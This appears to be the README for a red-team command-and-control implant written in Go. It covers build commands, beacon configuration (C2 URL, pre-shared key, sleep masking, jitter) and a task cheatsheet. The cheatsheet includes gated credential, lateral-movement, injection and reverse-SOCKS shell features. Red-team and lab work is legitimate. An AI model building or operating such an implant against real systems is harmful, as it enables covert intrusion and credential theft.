# sc5beacon - SquidC5 native implant v3.1

**Authorized red team / lab use only.**

## Build

```bash
cd agents/sc5beacon
go mod tidy
go test ./...
go build -ldflags="-s -w" -o sc5beacon .

GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o sc5beacon.exe .
GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o sc5beacon-arm64 .
```

## Configure

Priority: `SC5_CONFIG_B64` JSON blob -> individual env vars -> link-time `bakedConfigJSON`.

| Env | Required | Meaning |
|-----|----------|---------|
| `SC5_CONFIG_B64` | recommended | Base64 JSON config blob (factory emits this) |
| `SC5_URL` | yes* | `https://C2:8443/api/v1/implant/beacon` |
| `SC5_PSK` | yes* | Contents of server `data/implant_psk.txt` |
| `SC5_CHANNEL` | no | `http` (default) or `ws` |
| `SC5_WS_URL` | if ws | `wss://C2:8443/ws/v1/beacon` |
| `SC5_SLEEP` / `SC5_JITTER` | no | Sleep seconds / jitter % |
| `SC5_KILL_DATE` | no | Unix epoch exit |
| `SC5_MAX_MISS` | no | Exit after N failed check-ins |
| `SC5_WORK_START` / `SC5_WORK_END` | no | Working hours 0-23 |
| `SC5_SLEEP_MASK` | no | `jitter` \| `timer` \| `ekko` |
| `SC5_ALLOW_INJECT` | no | `1` enables lab inject stubs |
| `SC5_ALLOW_BOF` | no | `1` enables BOF host / catalog |
| `SC5_BOF_EXECUTE` | no | `1` research mapped-exec hook (still stub in default) |
| `SC5_ALLOW_POSTEX` | no | `1` enables cred/lateral/persist modules |

TLS always verifies system roots. **No** skip-verify flag.

## Features

- Config blob + factory stagers (bash / PowerShell stage0)
- Jobs: `job:start`, `job:list`, `job:get`, `job:kill`, `async` args
- SA JSON: `sa:whoami`, `sa:sysinfo`, `sa:env`, `sa:net`, `sa:users`, `sa:procs`
- Cred (gated): `cred:list`, `cred:env_secrets` (redacted), `cred:browser_paths`
- Lateral (gated): `lat:tcp_probe`, `lat:ssh_probe`, `lat:smb_probe`
- Persist (gated): `persist:plan` only — **no silent install**
- Files / shell / SOCKS reverse-dial
- HTTP + WebSocket AEAD channels
- COFF section parse + catalog BOF simulate; research exec hook
- Sleep mask + buffer wipe OPSEC helpers
- Injection technique catalog (lab stubs when gated)

## Task cheatsheet

```text
sa:whoami | sa:sysinfo | sa:net | module:list
file:list | file:read | file:write | file:delete
job:start {"command":"sleep 30"} | job:list
cred:env_secrets          # needs SC5_ALLOW_POSTEX=1
lat:tcp_probe host=x port=445
persist:plan
bof:run                   # SC5_ALLOW_BOF=1
inject:list               # SC5_ALLOW_INJECT=1
```

## Server APIs

```bash
GET  /api/v1/modules
POST /api/v1/modules/run   {"session_id","command","args"}
POST /api/v1/modules/bof/run
POST /api/v1/modules/inject
POST /api/v1/files/op      # offset/length/as_b64 chunking
```

## Server factory

```bash
sc5 implants build --os linux --arch amd64 --host C2 --port 8443
```
